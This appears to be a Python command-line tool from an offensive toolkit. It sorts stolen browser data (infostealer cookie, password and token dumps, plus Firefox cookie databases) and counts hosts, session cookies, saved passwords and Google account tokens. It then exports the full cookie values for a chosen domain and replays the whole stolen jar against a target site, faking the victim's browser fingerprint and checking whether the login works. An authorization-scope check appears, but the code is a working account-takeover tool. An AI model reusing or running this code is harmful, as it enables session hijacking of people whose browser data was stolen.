#!/usr/bin/env python3
"""浏览器 Cookie / 窃密包离线分诊。只出主机与字段统计，不打印 Cookie/密码/Token 值。

认三种包：
  1) Firefox cookies.sqlite（moz_cookies）
  2) Chrome 窃密目录：fingerprint.json + Default|Profile */cookies.json|passwords.json|tokens.json
  3) 单份 cookies.json（host/name/value 或 Playwright）

用法:
  python3 炼蛊房/browser_loot_triage.py from-case --case <案> [--path 额外目录或.rar] [--url 授权URL]
  python3 炼蛊房/browser_loot_triage.py replay --path <包> --url 授权URL [--case <案>] [--whole-jar]
  python3 炼蛊房/browser_loot_triage.py replay --case <案> --url 授权URL
  python3 炼蛊房/browser_loot_triage.py triage --path <sqlite|目录|json|rar> --case <案>
  python3 炼蛊房/browser_loot_triage.py export-scope --path <包> --domain 授权域 --case <案>
  python3 炼蛊房/browser_loot_triage.py doctor
"""
from __future__ import annotations

import argparse
import json
import re
import shutil
import sqlite3
import subprocess
import sys
import time
from collections import Counter
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

SESSIONISH = (
    "sess", "session", "sid", "token", "auth", "jwt", "csrf",
    "cf_clearance", "phpsessid", "user_session", "keeplogin",
)
GAIA_PREFIX = "accountid-"
_ENCODINGS = (
    "utf-8", "utf-8-sig", "gbk", "gb2312", "gb18030", "big5",
    "latin-1", "cp1252", "cp1254", "iso-8859-1", "iso-8859-9",
)
_LOGIN_RE = re.compile(
    r"登录会话过期|请重新登录|请先登录|Just a moment|请稍候|sign in|log in|login",
    re.I,
)


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def _host_key(h: str) -> str:
    h = (h or "").lstrip(".").lower()
    return h or "(empty)"


def _url_host(url: str) -> str:
    try:
        return (urlparse(url).hostname or "").lower()
    except Exception:
        return ""


def _sessionish(name: str) -> bool:
    low = (name or "").lower()
    return any(k in low for k in SESSIONISH)


def _try_parse_json(text: str) -> Any:
    text = (text or "").strip()
    if not text or text[0] not in "[{":
        return None
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        fixed = re.sub(r",\s*([\]}])", r"\1", text)
        try:
            return json.loads(fixed)
        except json.JSONDecodeError:
            return None


def _read_json(path: Path) -> Any:
    raw = path.read_bytes()
    for enc in _ENCODINGS:
        try:
            got = _try_parse_json(raw.decode(enc))
        except Exception:
            continue
        if got is not None:
            return got
    cleaned: list[str] = []
    for byte in raw:
        if 32 <= byte <= 126 or byte in (9, 10, 13):
            cleaned.append(chr(byte))
        else:
            cleaned.append(" ")
    return _try_parse_json(re.sub(r"\s+", " ", "".join(cleaned)))


def detect(path: Path) -> str:
    if path.is_file() and path.suffix.lower() == ".rar":
        return "rar"
    if path.is_file() and path.suffix.lower() in {".sqlite", ".db"}:
        return "firefox-sqlite"
    if path.is_file() and path.suffix.lower() == ".json":
        return "cookie-json"
    if path.is_dir():
        if (path / "fingerprint.json").is_file() or (path / "Default" / "cookies.json").is_file():
            return "stealer-dir"
        if any(path.glob("**/cookies.json")):
            return "stealer-dir"
        if (path / "cookies.sqlite").is_file():
            return "firefox-sqlite"
    return "unknown"


def find_unar() -> Path | None:
    for cand in (
        shutil.which("unar"),
        "/tmp/unar-bin/unar",
        str(ENGINE / "tools" / "vendor" / "unar"),
    ):
        if cand and Path(cand).is_file():
            return Path(cand)
    return None


def prepare(path: Path) -> Path:
    """rar 先解到同级 <stem>_unpacked，再认族。"""
    if path.is_file() and path.suffix.lower() == ".rar":
        unar = find_unar()
        if unar is None:
            raise SystemExit("[!] .rar 需要 unar（PATH / tools/vendor/unar）")
        dest = path.parent / f"{path.stem}_unpacked"
        dest.mkdir(parents=True, exist_ok=True)
        subprocess.run(
            [str(unar), "-o", str(dest), "-f", str(path)],
            check=False, capture_output=True,
        )
        if (dest / "fingerprint.json").is_file() or (dest / "Default").is_dir():
            return dest
        kids = [p for p in dest.iterdir() if p.is_dir()]
        if len(kids) == 1:
            return kids[0]
        return dest
    return path


def _is_loot_dir(path: Path) -> bool:
    return path.is_dir() and (
        (path / "fingerprint.json").is_file()
        or (path / "cookies.sqlite").is_file()
        or (path / "Default" / "cookies.json").is_file()
    )


def _is_loot_file(path: Path) -> bool:
    if not path.is_file():
        return False
    n = path.name.lower()
    return n.endswith(".rar") or n.endswith(".sqlite") or n in {"cookies.sqlite", "cookies.json"}


def case_loot_paths(case: str, extra: Path | None = None) -> list[Path]:
    """只扫案卷根/案卷/接管一层，禁止对 exports 做全树 find。"""
    hits: list[Path] = []
    seen: set[Path] = set()

    def add(p: Path) -> None:
        try:
            rp = p.resolve()
        except Exception:
            return
        if rp in seen or not p.exists():
            return
        seen.add(rp)
        hits.append(p)

    roots: list[Path] = []
    if case:
        base = ENGINE / "案卷" / case
        roots.extend([base, base / "测绘", base / "接管"])
    if extra:
        roots.append(extra)
    for root in roots:
        if root.is_file():
            add(root)
            continue
        if not root.is_dir():
            continue
        self_loot = _is_loot_dir(root)
        if self_loot:
            add(root)
        for p in root.iterdir():
            if _is_loot_file(p):
                if self_loot and p.name.lower() in {"cookies.json", "cookies.sqlite"}:
                    continue
                add(p)
            elif not self_loot and _is_loot_dir(p):
                add(p)
    return hits


def case_has_loot(case: str) -> bool:
    return bool(case and case_loot_paths(case))


def triage_firefox(db: Path) -> dict[str, Any]:
    con = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
    con.row_factory = sqlite3.Row
    rows = list(con.execute(
        "SELECT host, name, isSecure, isHttpOnly, sameSite, isPartitionedAttributeSet "
        "FROM moz_cookies"
    ))
    hosts: Counter[str] = Counter()
    names: Counter[str] = Counter()
    httponly = secure = 0
    for r in rows:
        hosts[_host_key(r["host"])] += 1
        if _sessionish(r["name"] or ""):
            names[str(r["name"])] += 1
        if r["isHttpOnly"]:
            httponly += 1
        if r["isSecure"]:
            secure += 1
    return {
        "kind": "firefox-sqlite",
        "cookie_count": len(rows),
        "httponly": httponly,
        "secure": secure,
        "hosts_top": hosts.most_common(25),
        "sessionish_names": names.most_common(30),
        "profiles": [{"name": "moz_cookies", "cookies": len(rows)}],
    }


def _cookie_rows(data: Any) -> list[dict[str, Any]]:
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    if isinstance(data, dict) and isinstance(data.get("cookies"), list):
        return [x for x in data["cookies"] if isinstance(x, dict)]
    return []


def triage_stealer(root: Path) -> dict[str, Any]:
    fps = list(root.rglob("fingerprint.json"))
    fp_sum: dict[str, Any] = {}
    if fps:
        raw = _read_json(fps[0])
        if isinstance(raw, dict):
            fp_sum = {
                "browser": raw.get("browser"),
                "browser_version": raw.get("browser_version"),
                "enterprise_managed": raw.get("enterprise_managed"),
                "profile_count": raw.get("profile_count"),
                "extension_count": raw.get("installed_extensions_count"),
                "password_manager_enabled": raw.get("password_manager_enabled"),
                "extraction_complete": raw.get("extraction_complete"),
            }
    hosts: Counter[str] = Counter()
    sess: Counter[str] = Counter()
    pwd_hosts: Counter[str] = Counter()
    profiles: list[dict[str, Any]] = []
    tokens_n = 0
    gaia_n = 0
    cookies_n = 0
    httponly = secure = 0
    pw_n = 0
    for cj in root.rglob("cookies.json"):
        rows = _cookie_rows(_read_json(cj) or [])
        cookies_n += len(rows)
        for c in rows:
            hosts[_host_key(str(c.get("host") or c.get("domain") or ""))] += 1
            if _sessionish(str(c.get("name") or "")):
                sess[str(c.get("name"))] += 1
            if c.get("is_httponly") or c.get("httpOnly") or c.get("isHttpOnly"):
                httponly += 1
            if c.get("is_secure") or c.get("secure"):
                secure += 1
        profiles.append({"name": str(cj.parent.name), "cookies": len(rows), "file": str(cj)})
    for pj in root.rglob("passwords.json"):
        data = _read_json(pj) or []
        if isinstance(data, list):
            pw_n += len(data)
            for row in data:
                if isinstance(row, dict):
                    h = _url_host(str(row.get("url") or ""))
                    if h:
                        pwd_hosts[h] += 1
    for tj in root.rglob("tokens.json"):
        data = _read_json(tj) or []
        if isinstance(data, list):
            tokens_n += len(data)
            for row in data:
                if isinstance(row, dict) and str(row.get("service") or "").lower().startswith(GAIA_PREFIX):
                    gaia_n += 1
    return {
        "kind": "stealer-dir",
        "fingerprint": fp_sum,
        "cookie_count": cookies_n,
        "httponly": httponly,
        "secure": secure,
        "password_count": pw_n,
        "token_count": tokens_n,
        "gaia_account_tokens": gaia_n,
        "hosts_top": hosts.most_common(25),
        "password_hosts_top": pwd_hosts.most_common(20),
        "sessionish_names": sess.most_common(30),
        "profiles": profiles,
    }


def triage_cookie_json(path: Path) -> dict[str, Any]:
    rows = _cookie_rows(_read_json(path) or [])
    hosts: Counter[str] = Counter()
    sess: Counter[str] = Counter()
    httponly = secure = 0
    for c in rows:
        hosts[_host_key(str(c.get("host") or c.get("domain") or ""))] += 1
        if _sessionish(str(c.get("name") or "")):
            sess[str(c.get("name"))] += 1
        if c.get("is_httponly") or c.get("httpOnly"):
            httponly += 1
        if c.get("is_secure") or c.get("secure"):
            secure += 1
    return {
        "kind": "cookie-json",
        "cookie_count": len(rows),
        "httponly": httponly,
        "secure": secure,
        "hosts_top": hosts.most_common(25),
        "sessionish_names": sess.most_common(30),
        "profiles": [{"name": path.name, "cookies": len(rows)}],
    }


def run_triage(path: Path) -> dict[str, Any]:
    path = prepare(path)
    kind = detect(path)
    if kind == "firefox-sqlite":
        db = path if path.is_file() else path / "cookies.sqlite"
        body = triage_firefox(db)
    elif kind == "stealer-dir":
        body = triage_stealer(path)
    elif kind == "cookie-json":
        body = triage_cookie_json(path)
    else:
        raise SystemExit(f"[!] 无法认族: {path}")
    report = {
        "ts": _now(),
        "path": str(path),
        **body,
        "playbook": "传承/窗·余烬.md",
        "skill": "偷生",
        "next": (
            "授权 URL → replay --url <URL> --case（整包 Cookie + 指纹 UA）；"
            "或 export-scope → session_import。目标必须 in_scope。"
        ),
        "note": "本报告不含 Cookie/密码/Token 值",
    }
    return report


def export_scope(path: Path, domain: str) -> dict[str, Any]:
    host = host_of(domain) or domain
    if not in_scope(host):
        raise SystemExit(f"[scope] {host} 不在授权范围")
    path = prepare(path)
    root = host.lower().lstrip(".")
    cookies: list[dict[str, Any]] = []
    kind = detect(path)
    if kind == "firefox-sqlite":
        db = path if path.is_file() else path / "cookies.sqlite"
        con = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
        for r in con.execute(
            "SELECT host, name, value, path, isSecure, isHttpOnly, expiry FROM moz_cookies"
        ):
            h = (r[0] or "").lstrip(".").lower()
            if root == h or h.endswith("." + root) or root.endswith("." + h):
                cookies.append({
                    "host": r[0], "name": r[1], "value": r[2], "path": r[3] or "/",
                    "is_secure": bool(r[4]), "is_httponly": bool(r[5]), "expires": r[6],
                })
    else:
        files = [path] if kind == "cookie-json" else list(path.rglob("cookies.json"))
        for f in files:
            for c in _cookie_rows(_read_json(f) or []):
                h = _host_key(str(c.get("host") or c.get("domain") or ""))
                if root == h or h.endswith("." + root) or root.endswith("." + h):
                    cookies.append(c)
    return {
        "domain": root,
        "cookie_count": len(cookies),
        "cookies": cookies,
        "next": f"python3 炼蛊房/session_import.py --domain {root} --input <本文件> --out <案卷>/接管/session",
    }


def ua_from_fp(fp: dict[str, Any]) -> str:
    if isinstance(fp.get("user_agent"), str) and fp["user_agent"].strip():
        return str(fp["user_agent"]).strip()
    browser = str(fp.get("browser") or "Chrome")
    version = str(fp.get("browser_version") or "126.0.0.0")
    return (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        f"(KHTML, like Gecko) {browser}/{version} Safari/537.36"
    )


def load_pack(path: Path) -> tuple[list[dict[str, Any]], dict[str, Any]]:
    path = prepare(path)
    kind = detect(path)
    fp: dict[str, Any] = {}
    cookies: list[dict[str, Any]] = []
    if kind == "firefox-sqlite":
        db = path if path.is_file() else path / "cookies.sqlite"
        con = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
        for r in con.execute(
            "SELECT host, name, value, path, isSecure, isHttpOnly, expiry FROM moz_cookies"
        ):
            cookies.append({
                "host": r[0], "name": r[1], "value": r[2], "path": r[3] or "/",
                "is_secure": bool(r[4]), "is_httponly": bool(r[5]), "expires": r[6],
            })
        return cookies, fp
    if kind == "cookie-json":
        return _cookie_rows(_read_json(path) or []), fp
    if kind == "stealer-dir":
        fps = list(path.rglob("fingerprint.json"))
        if fps:
            raw = _read_json(fps[0])
            if isinstance(raw, dict):
                fp = raw
        for f in path.rglob("cookies.json"):
            cookies.extend(_cookie_rows(_read_json(f) or []))
        return cookies, fp
    raise SystemExit(f"[!] 无法认族: {path}")


def build_session(
    cookies: list[dict[str, Any]],
    fp: dict[str, Any],
    rewrite_host: str | None = None,
):
    import requests

    sess = requests.Session()
    sess.headers.update({
        "User-Agent": ua_from_fp(fp),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
    })
    attached = 0
    names: list[str] = []
    for c in cookies:
        name = str(c.get("name") or "")
        if not name:
            continue
        value = "" if c.get("value") is None else str(c.get("value"))
        domain = (rewrite_host or str(c.get("host") or c.get("domain") or "")).lstrip(".")
        path = str(c.get("path") or "/") or "/"
        try:
            sess.cookies.set(name, value, domain=domain or None, path=path)
            attached += 1
            names.append(name)
        except Exception:
            continue
    return sess, attached, names


def _title_of(html: str) -> str:
    m = re.search(r"<title[^>]*>([^<]+)", html or "", re.I)
    return (m.group(1) if m else "").strip()[:160]


def replay_one(
    path: Path,
    url: str,
    *,
    method: str = "GET",
    whole_jar: bool = False,
    timeout: int = 30,
) -> dict[str, Any]:
    host = host_of(url) or url
    if not in_scope(host):
        raise SystemExit(f"[scope] {host} 不在授权范围")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    cookies, fp = load_pack(path)
    rewrite = host if whole_jar else None
    sess, attached, names = build_session(cookies, fp, rewrite_host=rewrite)
    import requests
    try:
        requests.packages.urllib3.disable_warnings()
    except Exception:
        pass

    started = time.time()
    try:
        if method.upper() == "POST":
            resp = sess.post(url, timeout=timeout, allow_redirects=True, verify=False)
        else:
            resp = sess.get(url, timeout=timeout, allow_redirects=True, verify=False)
        elapsed = int((time.time() - started) * 1000)
        text = resp.text or ""
        title = _title_of(text)
        return {
            "path": str(path),
            "url": url,
            "final_url": str(resp.url),
            "status": resp.status_code,
            "bytes": len(resp.content or b""),
            "elapsed_ms": elapsed,
            "title": title,
            "looks_login": bool(_LOGIN_RE.search(text) or _LOGIN_RE.search(title)),
            "cookie_loaded": attached,
            "cookie_names_sample": names[:20],
            "ua": ua_from_fp(fp),
            "whole_jar": whole_jar,
            "method": method.upper(),
        }
    except requests.RequestException as exc:
        return {
            "path": str(path),
            "url": url,
            "error": str(exc)[:200],
            "cookie_loaded": attached,
            "whole_jar": whole_jar,
        }


def run_replays(
    hits: list[Path],
    urls: list[str],
    *,
    whole_jar: bool = False,
    method: str = "GET",
) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for h in hits:
        for u in urls:
            try:
                out.append(replay_one(h, u, method=method, whole_jar=whole_jar))
            except SystemExit as exc:
                out.append({"path": str(h), "url": u, "error": str(exc)})
    return out


def cmd_from_case(
    case: str,
    extra: Path | None,
    domain: str,
    urls: list[str] | None = None,
    whole_jar: bool = False,
) -> int:
    hits = case_loot_paths(case, extra)
    if not hits:
        print(json.dumps({
            "case": case,
            "hits": 0,
            "note": "案卷根/案卷/接管未见 cookies.sqlite / .rar / fingerprint.json",
        }, ensure_ascii=False, indent=2))
        return 2
    reports: list[dict[str, Any]] = []
    for h in hits:
        try:
            reports.append(run_triage(h))
        except SystemExit as exc:
            reports.append({"path": str(h), "error": str(exc)})
    summaries = []
    for r in reports:
        summaries.append({
            "path": r.get("path"),
            "kind": r.get("kind"),
            "cookie_count": r.get("cookie_count"),
            "password_count": r.get("password_count"),
            "hosts_top": (r.get("hosts_top") or [])[:8],
            "error": r.get("error"),
        })
    merged: dict[str, Any] = {
        "ts": _now(),
        "case": case,
        "hit_paths": [str(h) for h in hits],
        "summaries": summaries,
        "playbook": "传承/窗·余烬.md",
        "next": (
            "python3 炼蛊房/browser_loot_triage.py replay --case "
            f"{case or '<案>'} --url <授权URL>"
        ),
        "note": "本报告不含 Cookie/密码/Token 值",
    }
    if domain:
        dumped = export_scope(hits[0], domain)
        merged["export_scope"] = {
            "domain": dumped["domain"],
            "cookie_count": dumped["cookie_count"],
        }
        if case:
            write_probe_json(
                dumped, case=case, case_subdir="browser_loot", filename="SCOPE_COOKIES.json"
            )
    replay_urls = list(urls or [])
    if domain and not replay_urls:
        replay_urls = [f"https://{host_of(domain) or domain}"]
    if replay_urls:
        merged["replay"] = run_replays(hits, replay_urls, whole_jar=whole_jar)
        if case:
            write_probe_json(
                {"ts": _now(), "replay": merged["replay"], "note": "不含 Cookie 值"},
                case=case, case_subdir="browser_loot", filename="REPLAY.json",
            )
    if case:
        write_probe_json(merged, case=case, case_subdir="browser_loot", filename="FROM_CASE.json")
    print(json.dumps(merged, ensure_ascii=False, indent=2))
    return 0 if any(s.get("cookie_count") for s in summaries) else 2


def cmd_replay(
    case: str,
    extra: Path | None,
    urls: list[str],
    whole_jar: bool,
    method: str,
) -> int:
    if not urls:
        raise SystemExit("[!] replay 需要 --url")
    hits = case_loot_paths(case, extra)
    if not hits:
        raise SystemExit("[!] 未见 sqlite / rar / 窃密目录（--case 或 --path）")
    rows = run_replays(hits, urls, whole_jar=whole_jar, method=method)
    body = {
        "ts": _now(),
        "case": case,
        "replay": rows,
        "playbook": "传承/窗·余烬.md",
        "note": "不含 Cookie/密码/Token 值",
        "next": "活会话 → session_import + session_pipeline；对象矩阵",
    }
    if case:
        write_probe_json(body, case=case, case_subdir="browser_loot", filename="REPLAY.json")
    print(json.dumps(body, ensure_ascii=False, indent=2))
    return 0 if any(r.get("status") for r in rows) else 2


def cmd_doctor() -> int:
    import tempfile

    checks: list[bool] = []
    with tempfile.TemporaryDirectory() as td:
        t = Path(td)
        (t / "fingerprint.json").write_text(json.dumps({
            "browser": "Chrome", "browser_version": "1", "enterprise_managed": True,
            "profile_count": 1, "installed_extensions_count": 0,
            "password_manager_enabled": True, "extraction_complete": True,
        }), encoding="utf-8")
        d = t / "Default"
        d.mkdir()
        (d / "cookies.json").write_text(json.dumps([{
            "host": ".example.com", "name": "PHPSESSID", "path": "/",
            "is_secure": True, "is_httponly": True, "expires": 1, "value": "x",
        }]), encoding="utf-8")
        (d / "passwords.json").write_text(json.dumps([
            {"url": "https://example.com/login", "user": "a", "pass": "b"},
        ]), encoding="utf-8")
        (d / "tokens.json").write_text(json.dumps([
            {"service": "AccountId-1", "token": "t", "binding_key": "k"},
        ]), encoding="utf-8")
        r = triage_stealer(t)
        checks.append(r["cookie_count"] == 1)
        checks.append(r["password_count"] == 1)
        checks.append(r["gaia_account_tokens"] == 1)
        checks.append(r["sessionish_names"][0][0] == "PHPSESSID")
        blob = json.dumps(r)
        checks.append('"value"' not in blob and '"pass"' not in blob)
        checks.append(detect(t) == "stealer-dir")
        checks.append(bool(case_loot_paths("", extra=t)))
        rar = t / "Chrome.rar"
        rar.write_bytes(b"Rar!\x1a")
        checks.append(detect(rar) == "rar")
        fake = t / "测绘"
        fake.mkdir()
        (fake / "cookies.sqlite").write_bytes(b"SQLite format 3\x00")
        checks.append(bool(case_loot_paths("", extra=fake)))
        cookies, fp = load_pack(t)
        checks.append(len(cookies) == 1 and cookies[0]["name"] == "PHPSESSID")
        checks.append("Chrome/1" in ua_from_fp(fp))
        sess, n, names = build_session(cookies, fp)
        checks.append(n == 1 and names == ["PHPSESSID"])
        checks.append("x" not in json.dumps({"cookie_names_sample": names}))
        broken = t / "broken.json"
        broken.write_bytes(b'[{"host":".x.com","name":"SID","value":"1",}]')
        rows = _cookie_rows(_read_json(broken) or [])
        checks.append(len(rows) == 1 and rows[0]["name"] == "SID")
    print(f"doctor {sum(checks)}/{len(checks)}")
    return 0 if all(checks) else 1


def main() -> int:
    ap = argparse.ArgumentParser(description="浏览器 Cookie / 窃密包离线分诊与整包回放（不打印值）")
    ap.add_argument("cmd", choices=("from-case", "replay", "triage", "export-scope", "doctor"))
    ap.add_argument("--path", default="")
    ap.add_argument("--domain", default="")
    ap.add_argument("--case", default="")
    ap.add_argument("--url", action="append", default=[], help="授权目标 URL，可重复")
    ap.add_argument("--whole-jar", action="store_true", help="把整包 Cookie 域名改写到目标 host 再发")
    ap.add_argument("--method", default="GET", choices=("GET", "POST"))
    args = ap.parse_args()
    if args.cmd == "doctor":
        return cmd_doctor()
    extra = Path(args.path).expanduser().resolve() if args.path else None
    if extra is not None and not extra.exists():
        raise SystemExit(f"[!] 不存在: {extra}")
    if args.cmd == "from-case":
        if not args.case and extra is None:
            raise SystemExit("[!] from-case 需要 --case 或 --path")
        return cmd_from_case(args.case, extra, args.domain, args.url, args.whole_jar)
    if args.cmd == "replay":
        return cmd_replay(args.case, extra, args.url, args.whole_jar, args.method)
    if extra is None:
        raise SystemExit("[!] 需要 --path")
    if args.cmd == "triage":
        report = run_triage(extra)
        if args.case:
            write_probe_json(report, case=args.case, case_subdir="browser_loot", filename="TRIAGE.json")
        print(json.dumps(report, ensure_ascii=False, indent=2))
        return 0
    if not args.domain:
        raise SystemExit("[!] export-scope 需要 --domain 授权域")
    dumped = export_scope(extra, args.domain)
    if args.case:
        write_probe_json(dumped, case=args.case, case_subdir="browser_loot", filename="SCOPE_COOKIES.json")
    print(json.dumps({
        "domain": dumped["domain"],
        "cookie_count": dumped["cookie_count"],
        "next": dumped["next"],
        "note": "完整 cookies 只写案卷 SCOPE_COOKIES.json，不打屏幕",
    }, ensure_ascii=False, indent=2))
    return 0 if dumped["cookie_count"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
